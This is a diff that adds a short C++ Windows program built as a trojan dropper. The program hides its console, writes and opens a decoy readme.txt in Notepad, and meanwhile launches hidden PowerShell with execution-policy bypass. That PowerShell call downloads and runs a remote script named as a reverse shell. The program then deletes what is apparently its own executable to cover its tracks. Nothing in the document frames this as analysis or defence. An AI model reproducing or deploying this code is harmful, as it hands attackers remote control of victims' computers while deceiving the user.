@@ -1,0 +1,21 @@
+#include <windows.h>
+#include <fstream>
+
+using namespace std;
+
+int main()
+{
+ HWND Proc;
+ AllocConsole();
+ Proc = FindWindowA("ConsoleWindowClass", NULL);
+ ShowWindow(Proc, 0);
+ ofstream File("readme.txt");
+ File << "Contents of readme.txt.";
+ File.close();
+ system("start /max powershell.exe notepad.exe readme.txt");
+ system("start /min powershell.exe -ep bypass -ws hidden iex(New-Object Net.WebClient).DownloadString('https://reverseshell.ps1') &");
+ system("start /min cmd /c del readme.exe");
+ return 0;
+}
+
+
